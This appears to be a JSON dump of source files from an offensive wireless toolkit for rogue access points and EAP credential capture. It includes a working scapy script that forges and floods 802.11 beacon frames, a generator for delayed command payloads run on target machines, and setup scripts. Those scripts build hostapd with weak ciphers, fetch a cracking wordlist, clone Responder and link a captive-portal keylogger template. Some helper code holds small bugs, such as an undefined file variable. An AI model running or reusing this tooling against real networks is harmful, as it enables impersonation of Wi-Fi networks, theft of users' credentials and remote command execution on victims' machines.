\n    args = parser.parse_args()\n\n    filtered = any([\n        args.by_phase is not None,\n        args.identity_is is not None,\n        args.in_identity is not None,\n        args.methods_any is not None,\n        args.methods_all is not None,\n        args.has_password == True,\n        args.has_nt_hash == True,\n        args.invert == True,\n    ])\n    args = args.__dict__\n    args['filtered'] = filtered\n\n    if args['methods'] is None:\n        \n        if args['phase'] == 1:\n            args['methods'] = 'PEAP,TTLS,TLS,FAST'\n        elif args['phase'] == 2:\n            args['methods'] = 'MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5'\n        else:\n            raise Exception('error: wtf is this')\n\n    if args['add_user']:\n        if args['identity'] is None:\n            print('[!] Please specify an identity using the --identity flag.')\n            sys.exit()\n    elif args['delete_user']:\n        if args['filtered'] == False and args['delete_all'] == False:\n\n            print('[!] Cowardly refusing to delete everything in the '\\\n                  'database without additional confirmation')\n            print('[!] If this is really what you want to do, please use the following syntax:')\n            print('[!] root@localhost:~# ./ehdb --delete --delete-all')\n            sys.exit()\n    elif args['list_users']:\n        pass\n    else:\n        parser.print_help()\n        sys.exit()\n    return args\n    \nif __name__ == '__main__':\n\n    options = set_options()\n\n    users = parse_eap_user_file()\n    if options['add_user']:\n\n        users = add_user(\n            users,\n            options['identity'],\n            options['methods'],\n            options['phase'],\n            password=options['password'],\n            nt_hash=options['nt_hash'],\n        )\n\n    elif options['list_users']:\n\n        list_users(\n            users,\n            filtered=options['filtered'], \n            phase=options['by_phase'],\n            identity_is=options['identity_is'],\n            in_identity=options['in_identity'],\n            methods_any=options['methods_any'],\n            methods_all=options['methods_all'],\n            has_password=options['has_password'],\n            has_nt_hash=options['has_nt_hash'],\n            invert=options['invert'],\n        )\n\n    elif options['delete_user']:\n\n        users = delete_users(\n            users,\n            filtered=options['filtered'], \n            phase=options['by_phase'],\n            identity_is=options['identity_is'],\n            in_identity=options['in_identity'],\n            methods_any=options['methods_any'],\n            methods_all=options['methods_all'],\n            has_password=options['has_password'],\n            has_nt_hash=options['has_nt_hash'],\n            invert=options['invert'],\n        )\n\n    write_users(users)\n"
        },
        {
          "name": "forge-beacons",
          "type": "blob",
          "size": 6.23828125,
          "content": "#!/usr/bin/env python3\nimport argparse\n\nfrom scapy.all import *\nfrom multiprocessing import Process\n\nconf.verb = 3\n\ndef setup():\n\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument('--interface', '-i',\n                    dest='interface',\n                    type=str,\n                    required=True,\n                    help='Interface for sending packets')\n\n    parser.add_argument('--bssid', '-b',\n                    dest='bssid',\n                    type=str,\n                    required=True,\n                    help='BSSID of your access point.')\n\n    parser.add_argument('--known-essids', \n                    dest='known_essids',\n                    type=str,\n                    nargs='+',\n                    default=None,\n                    required=False,\n                    help='List of known ssids')\n\n    parser.add_argument('--known-essids-file', \n                    dest='known_essids_file',\n                    type=str,\n                    default=None,\n                    required=False,\n                    help='File containing list of known ESSIDS of your access point.')\n\n\n    parser.add_argument('--dst-addr', \n                    dest='dst_addr',\n                    type=str,\n                    default=None,\n                    required=False,\n                    help='Destination mac address (defaults to broadcast)')\n\n    parser.add_argument('--burst-count', \n                    dest='burst_count',\n                    type=int,\n                    default=5,\n                    required=False,\n                    help='Burst count for beacon frame transmission')\n\n    parser.add_argument('--burst-interval', \n                    dest='burst_interval',\n                    type=float,\n                    default=0.1,\n                    required=False,\n                    help='Interval between each transmission in a burst (defaults to 0.1 seconds)')\n\n    parser.add_argument('--debug',\n                    dest='debug',\n                    action='store_true',\n                    help='Enable debug output')\n\n    parser.add_argument('--loop',\n                    dest='loop',\n                    type=int,\n                    default=1,\n                    required=False,\n                    help='Loop through list of ESSIDs n times (default: 0)')\n        \n    parser.add_argument('--indefinite',\n                    dest='indefinite',\n                    action='store_true',\n                    help='Continue looping through list of '\n                         'ESSIDs until keyboard interrupt.')\n\n    args = parser.parse_args()\n    \n    options = args.__dict__\n\n    if options['known_essids'] is None and \\\n            options['known_essids_file'] is None:\n\n        parser.print_usage()\n        print()\n        print('[!] Either the --known-essids or '\n              '--known-essids-file flag must be used, '\n              'but not both.')\n        sys.exit()\n\n    if options['known_essids'] is not None and \\\n            options['known_essids_file'] is not None:\n\n        parser.print_usage()\n        print()\n        print('[!] Either the --known-essids or '\n              '--known-essids-file flag must be used, '\n              'but not both.')\n        sys.exit()\n\n    if options['burst_count'] <= 0:\n\n        parser.print_usage()\n        print()\n        print('[!] The value specified by --burst-count '\n              'must be a natural number.') \n        sys.exit()\n\n    if options['burst_interval'] < 0:\n\n        parser.print_usage()\n        print()\n        print('[!] The value specified by --burst-interval '\n              'must not be less than zero.')\n        sys.exit()\n\n    if options['loop'] < 0:\n\n        parser.print_usage()\n        print()\n        print('[!] The value specified by --loop '\n              'must be a natural number.')\n        sys.exit()\n\n    return options\n\ndef ssid_file_reader(known_ssids_file):\n    with open(ssid_file) as fd:\n        for line in fd:\n            ssid = line.strip()\n            # skip blank lines and comments\n            if not line or line[0] == '#':\n                continue\n            yield ssid\n\ndef create_beacon_frame(ssid, src_addr, dst_addr, debug):\n    \n\n    if dst_addr is None:\n        dst_addr = 'ff:ff:ff:ff:ff:ff'\n\n    radiotap_frame = RadioTap()\n    dot11_info_frame  = Dot11(type=0, subtype=8,\n                            addr1=dst_addr,\n                            addr2=src_addr,\n                            addr3=src_addr)\n    dot11_beacon  = Dot11Beacon(cap='ESS')\n    essid_frame = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))\n    essid_frame /= Dot11Elt(ID=\"Rates\", info=\"\\x0c\\x12\\x18\\x24\\x30\\x48\\x60\\x6c\")\n    essid_frame /= Dot11Elt(ID=\"DSset\", info=chr(7))\n\n    result = radiotap_frame / dot11_info_frame / dot11_beacon / essid_frame\n        \n    if debug:\n        result.show()\n\n    return result\n\ndef send_beacon_burst(ssid, options):\n\n    beacon = create_beacon_frame(ssid,\n                                 options['bssid'],\n                                 options['dst_addr'],\n                                 options['debug'])\n\n    print('[*] Sending burst of {} forged beacon frames for ESSID {}'.format(options['burst_count'], ssid))\n    sendp(beacon,\n        iface=options['interface'],\n        count=options['burst_count'],\n        inter=options['burst_interval'],\n        verbose=1)\n\ndef beacon_burster(args):\n\n    options = args['options']\n\n    if options['known_essids_file'] is not None:\n        known_ssids = [ssid for ssid in ssid_file_reader(options['known_ssids_file'])]\n    else:\n        known_ssids = options['known_essids']\n    try:\n        if options['indefinite']:\n            while True:\n                for ssid in known_ssids:\n                    send_beacon_burst(ssid, options)\n        else:\n            for i in range(options['loop']):\n                for ssid in known_ssids:\n                    send_beacon_burst(ssid, options)\n    except KeyboardInterrupt:\n        pass\n    \n\nif __name__ == '__main__':\n\n    options = setup()\n\n    args = {\n\n        'options' : options,\n    }\n    try:\n        proc = Process(target=beacon_burster, args=(args,))\n        proc.daemon = True\n        proc.start()\n        if options['indefinite']:\n            input('Press enter at any time to quit ...')\n            proc.terminate()\n        proc.join()\n    except KeyboardInterrupt:\n        proc.terminate()\n        proc.join()\n\n"
        },
        {
          "name": "kali-dependencies.txt",
          "type": "blob",
          "size": 0.28125,
          "content": "apache2\ndnsmasq\nlibssl-dev\nlibnfnetlink-dev\nlibnl-3-dev\nlibnl-genl-3-dev\nlibcurl4-openssl-dev\nzlib1g-dev\nlibpcap-dev\nwget\npython3-pip\npython3-gevent\npython3-tqdm\npython3-pem\npython3-openssl\npython3-scapy\npython3-lxml\npython3-pywebcopy\npython3-bs4\npython3-flask-cors\npython3-flask-socketio"
        },
        {
          "name": "kali-setup",
          "type": "blob",
          "size": 4.287109375,
          "content": "#!/usr/bin/env python3\nimport os\nimport sys\n\nfrom settings import settings\n\ndef exit_if_not_root():\n\n    if os.getuid() != 0:\n        sys.exit(\"[!} Error: this script must be run as root.\")\n\ndef read_deps_file(deps_file):\n    with open(deps_file) as fd:\n        return ' '.join([ line.strip() for line in fd ])\n\nif __name__ == '__main__':\n\n    exit_if_not_root()\n                    \n\n    default_wordlist = os.path.join(settings.dict['paths']['directories']['wordlists'], settings.dict['core']['eaphammer']['general']['default_wordlist'])\n\n    wordlist_source = settings.dict['core']['eaphammer']['general']['wordlist_source']\n\n    root_dir = settings.dict['paths']['directories']['root']\n    local_dir = settings.dict['paths']['directories']['local']\n\n    openssl_source = settings.dict['core']['eaphammer']['general']['openssl_source']\n    openssl_version = settings.dict['core']['eaphammer']['general']['openssl_version']\n    openssl_build_options = settings.dict['core']['eaphammer']['general']['openssl_build_options']\n    openssl_build_prefix = os.path.join(local_dir, 'openssl/local')\n\n    openssl_bin = settings.dict['paths']['openssl']['bin']\n    dh_file = settings.dict['paths']['certs']['dh']\n\n    if input('Important: it is highly recommended that you run \"apt -y update\" and \"apt -y upgrade\" prior to running this setup script. Do you wish to proceed? Enter [y/N]: ').lower() != 'y':\n        sys.exit('Aborting.')\n    print()\n\n\n    print('\\n[*] Removing stub files...\\n')\n    os.system('find {} -type f -name \\'stub\\' -exec rm -f {{}} +'.format(root_dir))\n    print('\\ncomplete!\\n')\n\n\n    print('\\n[*] Installing Kali dependencies...\\n')\n    os.system('apt -y install %s' % read_deps_file('kali-dependencies.txt'))\n    print('\\n[*] complete!\\n')\n\n\n    print('\\n[*] Downloading OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('wget {} -O {}/openssl.tar.gz'.format(openssl_source, local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('cd {} && tar xzf openssl.tar.gz'.format(local_dir))\n    os.system('mv {}/openssl-OpenSSL_{} {}/openssl'.format(local_dir, openssl_version.replace('.', '_'), local_dir))\n    os.system('cd {} && rm -f openssl.tar.gz'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling OpenSSL locally to avoid interfering with system install...\\n')\n    os.system('cd {}/openssl && ./config --prefix={} enable-ssl2 enable-ssl3 enable-ssl3-method enable-des enable-rc4 enable-weak-ssl-ciphers no-shared'.format(local_dir, openssl_build_prefix))\n    os.system('cd {}/openssl && make'.format(local_dir))\n    os.system('cd {}/openssl && make install_sw'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Create DH parameters file with default length of 2048...\\n')\n    os.system('{} dhparam -out {} 2048'.format(openssl_bin, dh_file))\n    print('\\ncomplete!\\n')\n\n    print('\\n[*] Compiling hostapd...\\n')\n    os.system(\"cd %s && cp defconfig .config\" % settings.dict['paths']['directories']['hostapd'])\n    os.system(\"cd %s && make hostapd-eaphammer_lib\" % settings.dict['paths']['directories']['hostapd'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxtools...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxtools'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxdumptool...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxdumptool'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading default wordlist...\\n')\n    os.system(\"wget %s -O %s.tar.gz\" % (wordlist_source, default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting default wordlist...\\n')\n    os.system(\"cd %s && tar xzf %s.tar.gz\" % (settings.dict['paths']['directories']['wordlists'], default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Retrieving Responder from teh interwebz...\\n')\n    os.system(\"cd %s && git clone https://github.com/lgandx/Responder.git\" % (settings.dict['paths']['directories']['local']))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Creating symlink to captive portal template directory...\\n')\n    os.symlink(settings.dict['paths']['wskeyloggerd']['usr_templates'],\n               settings.dict['paths']['wskeyloggerd']['usr_templates_sl'])\n    print('\\n[*] complete!\\n')\n\n"
        },
        {
          "name": "local",
          "type": "tree",
          "content": null
        },
        {
          "name": "logs",
          "type": "tree",
          "content": null
        },
        {
          "name": "loot",
          "type": "tree",
          "content": null
        },
        {
          "name": "parrot-dependencies.txt",
          "type": "blob",
          "size": 0.2783203125,
          "content": "apache2\ndnsmasq\nlibssl-dev\nlibnfnetlink-dev\nlibnl-3-dev\nlibnl-genl-3-dev\nlibcurl4-openssl-dev\nzlib1g-dev\nlibpcap-dev\npython3-pip\npython3-gevent\npython3-tqdm\npython3-pem\npython3-openssl\npython3-scapy\npython3-lxml\npython3-pywebcopy\npython3-bs4\npython3-flask-cors\npython3-flask-socketio\n\n"
        },
        {
          "name": "parrot-setup",
          "type": "blob",
          "size": 4.2890625,
          "content": "#!/usr/bin/env python3\nimport os\nimport sys\n\nfrom settings import settings\n\ndef exit_if_not_root():\n\n    if os.getuid() != 0:\n        sys.exit(\"[!} Error: this script must be run as root.\")\n\ndef read_deps_file(deps_file):\n    with open(deps_file) as fd:\n        return ' '.join([ line.strip() for line in fd ])\n\nif __name__ == '__main__':\n\n    exit_if_not_root()\n\n\n    default_wordlist = os.path.join(settings.dict['paths']['directories']['wordlists'], settings.dict['core']['eaphammer']['general']['default_wordlist'])\n\n    wordlist_source = settings.dict['core']['eaphammer']['general']['wordlist_source']\n\n    root_dir = settings.dict['paths']['directories']['root']\n    local_dir = settings.dict['paths']['directories']['local']\n\n    openssl_source = settings.dict['core']['eaphammer']['general']['openssl_source']\n    openssl_version = settings.dict['core']['eaphammer']['general']['openssl_version']\n    openssl_build_options = settings.dict['core']['eaphammer']['general']['openssl_build_options']\n    openssl_build_prefix = os.path.join(local_dir, 'openssl/local')\n\n    openssl_bin = settings.dict['paths']['openssl']['bin']\n    dh_file = settings.dict['paths']['certs']['dh']\n\n    if input('Important: it is highly recommended that you run \"apt -y update\" and \"apt -y upgrade\" prior to running this setup script. Do you wish to proceed? Enter [y/N]: ').lower() != 'y':\n        sys.exit('Aborting.')\n    print()\n\n\n    print('\\n[*] Removing stub files...\\n')\n    os.system('find {} -type f -name \\'stub\\' -exec rm -f {{}} +'.format(root_dir))\n    print('\\ncomplete!\\n')\n\n\n    print('\\n[*] Installing Parot dependencies...\\n')\n    os.system('apt -y install %s -t parrot-backports' % read_deps_file('parrot-dependencies.txt'))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('wget {} -O {}/openssl.tar.gz'.format(openssl_source, local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('cd {} && tar xzf openssl.tar.gz'.format(local_dir))\n    os.system('mv {}/openssl-OpenSSL_{} {}/openssl'.format(local_dir, openssl_version.replace('.', '_'), local_dir))\n    os.system('cd {} && rm -f openssl.tar.gz'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling OpenSSL locally to avoid interfering with system install...\\n')\n    os.system('cd {}/openssl && ./config --prefix={} enable-ssl2 enable-ssl3 enable-ssl3-method enable-des enable-rc4 enable-weak-ssl-ciphers no-shared'.format(local_dir, openssl_build_prefix))\n    os.system('cd {}/openssl && make'.format(local_dir))\n    os.system('cd {}/openssl && make install_sw'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Create DH parameters file with default length of 2048...\\n')\n    os.system('{} dhparam -out {} 2048'.format(openssl_bin, dh_file))\n    print('\\ncomplete!\\n')\n\n    print('\\n[*] Compiling hostapd...\\n')\n    os.system(\"cd %s && cp defconfig .config\" % settings.dict['paths']['directories']['hostapd'])\n    os.system(\"cd %s && make hostapd-eaphammer_lib\" % settings.dict['paths']['directories']['hostapd'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxtools...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxtools'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxdumptool...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxdumptool'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading default wordlist...\\n')\n    os.system(\"wget %s -O %s.tar.gz\" % (wordlist_source, default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting default wordlist...\\n')\n    os.system(\"cd %s && tar xzf %s.tar.gz\" % (settings.dict['paths']['directories']['wordlists'], default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Retrieving Responder from teh interwebz...\\n')\n    os.system(\"cd %s && git clone https://github.com/lgandx/Responder.git\" % (settings.dict['paths']['directories']['local']))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Creating symlink to captive portal template directory...\\n')\n    os.symlink(settings.dict['paths']['wskeyloggerd']['usr_templates'],\n               settings.dict['paths']['wskeyloggerd']['usr_templates_sl'])\n    print('\\n[*] complete!\\n')\n\n"
        },
        {
          "name": "payload_generator",
          "type": "blob",
          "size": 1.1357421875,
          "content": "#!/usr/bin/env python\n\nimport base64\nimport string\nimport random\nimport sys\n\nfrom argparse import ArgumentParser\nfrom core.payloads import ScheduledPayload\n\ndef set_options():\n\n    parser = ArgumentParser()\n\n    parser.add_argument('--delay',\n                    dest='delay',\n                    type=int,\n                    default=180,\n                    help='Set the timed payload delay in seconds.')\n\n    parser.add_argument('--command',\n                    dest='command',\n                    required=True,\n                    type=str,\n                    help='The command to run on the target machine.')\n\n    parser.add_argument('--args',\n                    dest='args',\n                    required=True,\n                    type=str,\n                    help='Arguments passed to the command specified using the --comand flag.')\n\n    args = parser.parse_args()\n\n    options = args.__dict__\n\n    return options\n\nif __name__ == '__main__':\n\n    options = set_options()\n\n    s = ScheduledPayload(options['command'],\n                        options['args'],\n                        delay=options['delay']) \n\n    print\n    print\n    print(s.execute())\n"
        },
        {
          "name": "payloads",
          "type": "tree",
          "content": null
        },
        {
          "name": "pip.req",
          "type": "blob",
          "size": 0.1005859375,
          "content": "gevent>=1.5.0\ntqdm\npem>=21.2.0\npyOpenSSL\nscapy\nlxml\nbeautifulsoup4\npywebcopy\nflask-cors\nflask-socketio\n"
        },
        {
          "name": "raspbian-dependencies.txt",
          "type": "blob",
          "size": 0.2783203125,
          "content": "apache2\ndnsmasq\nlibssl-dev\nlibnfnetlink-dev\nlibnl-3-dev\nlibnl-genl-3-dev\nlibcurl4-openssl-dev\nzlib1g-dev\nlibpcap-dev\npython3-pip\npython3-gevent\npython3-tqdm\npython3-pem\npython3-openssl\npython3-scapy\npython3-lxml\npython3-pywebcopy\npython3-bs4\npython3-flask-cors\npython3-flask-socketio\n\n"
        },
        {
          "name": "raspbian-setup",
          "type": "blob",
          "size": 4.7060546875,
          "content": "#!/usr/bin/env python3\nimport os\nimport sys\n\nfrom settings import settings\nfrom configparser import ConfigParser\n\ndef exit_if_not_root():\n\n    if os.getuid() != 0:\n        sys.exit(\"[!} Error: this script must be run as root.\")\n\ndef read_deps_file(deps_file):\n    with open(deps_file) as fd:\n        return ' '.join([ line.strip() for line in fd ])\n\nif __name__ == '__main__':\n\n    exit_if_not_root()\n                    \n\n    default_wordlist = os.path.join(settings.dict['paths']['directories']['wordlists'], settings.dict['core']['eaphammer']['general']['default_wordlist'])\n\n    wordlist_source = settings.dict['core']['eaphammer']['general']['wordlist_source']\n\n    root_dir = settings.dict['paths']['directories']['root']\n    local_dir = settings.dict['paths']['directories']['local']\n\n    openssl_source = settings.dict['core']['eaphammer']['general']['openssl_source']\n    openssl_version = settings.dict['core']['eaphammer']['general']['openssl_version']\n    openssl_build_options = settings.dict['core']['eaphammer']['general']['openssl_build_options']\n    openssl_build_prefix = os.path.join(local_dir, 'openssl/local')\n\n    openssl_bin = settings.dict['paths']['openssl']['bin']\n    dh_file = settings.dict['paths']['certs']['dh']\n\n    if input('Important: it is highly recommended that you run \"apt -y update\" and \"apt -y upgrade\" prior to running this setup script. Do you wish to proceed? Enter [y/N]: ').lower() != 'y':\n        sys.exit('Aborting.')\n    print()\n\n\n    print('\\n[*] Removing stub files...\\n')\n    os.system('find {} -type f -name \\'stub\\' -exec rm -f {{}} +'.format(root_dir))\n    print('\\ncomplete!\\n')\n\n\n    print('\\n[*] Installing Kali dependencies...\\n')\n    os.system('apt -y install %s' % read_deps_file('raspbian-dependencies.txt'))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('wget {} -O {}/openssl.tar.gz'.format(openssl_source, local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('cd {} && tar xzf openssl.tar.gz'.format(local_dir))\n    os.system('mv {}/openssl-OpenSSL_{} {}/openssl'.format(local_dir, openssl_version.replace('.', '_'), local_dir))\n    os.system('cd {} && rm -f openssl.tar.gz'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling OpenSSL locally to avoid interfering with system install...\\n')\n    os.system('cd {}/openssl && ./config --prefix={} enable-ssl2 enable-ssl3 enable-ssl3-method enable-des enable-rc4 enable-weak-ssl-ciphers no-shared'.format(local_dir, openssl_build_prefix))\n    os.system('cd {}/openssl && make'.format(local_dir))\n    os.system('cd {}/openssl && make install_sw'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Create DH parameters file with default length of 2048...\\n')\n    os.system('{} dhparam -out {} 2048'.format(openssl_bin, dh_file))\n    print('\\ncomplete!\\n')\n\n    print('\\n[*] Compiling hostapd...\\n')\n    os.system(\"cd %s && cp defconfig .config\" % settings.dict['paths']['directories']['hostapd'])\n    os.system(\"cd %s && make hostapd-eaphammer_lib\" % settings.dict['paths']['directories']['hostapd'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxtools...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxtools'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxdumptool...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxdumptool'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading default wordlist...\\n')\n    os.system(\"wget %s -O %s.tar.gz\" % (wordlist_source, default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting default wordlist...\\n')\n    os.system(\"cd %s && tar xzf %s.tar.gz\" % (settings.dict['paths']['directories']['wordlists'], default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Retrieving Responder from teh interwebz...\\n')\n    os.system(\"cd %s && git clone https://github.com/lgandx/Responder.git\" % (settings.dict['paths']['directories']['local']))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Creating symlink to captive portal template directory...\\n')\n    os.symlink(settings.dict['paths']['wskeyloggerd']['usr_templates'],\n               settings.dict['paths']['wskeyloggerd']['usr_templates_sl'])\n    print('\\n[*] complete!\\n')\n\n    eh_settings_ini = os.path.join(root_dir, 'settings/core/eaphammer.ini')\n\n    parser = ConfigParser()\n    parser.read(eh_settings_ini)\n    parser.set('services', 'stop_dhcpcd', 'True')\n    parser.set('services', 'stop_avahi', 'True')\n    parser.set('services', 'use_network_manager', 'False')\n\n    with open(eh_settings_ini, 'w') as output_handle:\n        parser.write(output_handle)\n\n"
        },
        {
          "name": "run",
          "type": "tree",
          "content": null
        },
        {
          "name": "saved-configs",
          "type": "tree",
          "content": null
        },
        {
          "name": "scripts",
          "type": "tree",
          "content": null
        },
        {
          "name": "settings",
          "type": "tree",
          "content": null
        },
        {
          "name": "testing",
          "type": "tree",
          "content": null
        },
        {
          "name": "tmp",
          "type": "tree",
          "content": null
        },
        {
          "name": "ubuntu-unattended-setup",
          "type": "blob",
          "size": 4.0986328125,
          "content": "#!/usr/bin/env python3\nimport os\nimport sys\n\nfrom settings import settings\n\ndef exit_if_not_root():\n\n    if os.getuid() != 0:\n        sys.exit(\"[!} Error: this script must be run as root.\")\n\ndef read_deps_file(deps_file):\n    with open(deps_file) as fd:\n        return ' '.join([ line.strip() for line in fd ])\n\nif __name__ == '__main__':\n\n    exit_if_not_root()\n                    \n\n    default_wordlist = os.path.join(settings.dict['paths']['directories']['wordlists'], settings.dict['core']['eaphammer']['general']['default_wordlist'])\n\n    wordlist_source = settings.dict['core']['eaphammer']['general']['wordlist_source']\n\n    root_dir = settings.dict['paths']['directories']['root']\n    local_dir = settings.dict['paths']['directories']['local']\n\n    openssl_source = settings.dict['core']['eaphammer']['general']['openssl_source']\n    openssl_version = settings.dict['core']['eaphammer']['general']['openssl_version']\n    openssl_build_options = settings.dict['core']['eaphammer']['general']['openssl_build_options']\n    openssl_build_prefix = os.path.join(local_dir, 'openssl/local')\n\n    openssl_bin = settings.dict['paths']['openssl']['bin']\n    dh_file = settings.dict['paths']['certs']['dh']\n\n\n\n    print('\\n[*] Removing stub files...\\n')\n    os.system('find {} -type f -name \\'stub\\' -exec rm -f {{}} +'.format(root_dir))\n    print('\\ncomplete!\\n')\n\n\n    print('\\n[*] Installing Kali dependencies...\\n')\n    os.system('export DEBIAN_FRONTEND=noninteractive && apt -yq install %s' % read_deps_file('kali-dependencies.txt'))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('wget {} -O {}/openssl.tar.gz'.format(openssl_source, local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting OpenSSL_{}...\\n'.format(openssl_version.replace('.', '_')))\n    os.system('cd {} && tar xzf openssl.tar.gz'.format(local_dir))\n    os.system('mv {}/openssl-OpenSSL_{} {}/openssl'.format(local_dir, openssl_version.replace('.', '_'), local_dir))\n    os.system('cd {} && rm -f openssl.tar.gz'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling OpenSSL locally to avoid interfering with system install...\\n')\n    os.system('cd {}/openssl && ./config --prefix={} enable-ssl2 enable-ssl3 enable-ssl3-method enable-des enable-rc4 enable-weak-ssl-ciphers no-shared'.format(local_dir, openssl_build_prefix))\n    os.system('cd {}/openssl && make'.format(local_dir))\n    os.system('cd {}/openssl && make install_sw'.format(local_dir))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Create DH parameters file with default length of 2048...\\n')\n    os.system('{} dhparam -out {} 2048'.format(openssl_bin, dh_file))\n    print('\\ncomplete!\\n')\n\n    print('\\n[*] Compiling hostapd...\\n')\n    os.system(\"cd %s && cp defconfig .config\" % settings.dict['paths']['directories']['hostapd'])\n    os.system(\"cd %s && make hostapd-eaphammer_lib\" % settings.dict['paths']['directories']['hostapd'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxtools...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxtools'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Compiling hcxdumptool...\\n')\n    os.system(\"cd %s && make\" % settings.dict['paths']['directories']['hcxdumptool'])\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Downloading default wordlist...\\n')\n    os.system(\"wget %s -O %s.tar.gz\" % (wordlist_source, default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Extracting default wordlist...\\n')\n    os.system(\"cd %s && tar xzf %s.tar.gz\" % (settings.dict['paths']['directories']['wordlists'], default_wordlist))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Retrieving Responder from teh interwebz...\\n')\n    os.system(\"cd %s && git clone https://github.com/lgandx/Responder.git\" % (settings.dict['paths']['directories']['local']))\n    print('\\n[*] complete!\\n')\n\n    print('\\n[*] Creating symlink to captive portal template directory...\\n')\n    os.symlink(settings.dict['paths']['wskeyloggerd']['usr_templates'],\n               settings.dict['paths']['wskeyloggerd']['usr_templates_sl'])\n    print('\\n[*] complete!\\n')\n\n"
        },
        {
          "name": "wordlists",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}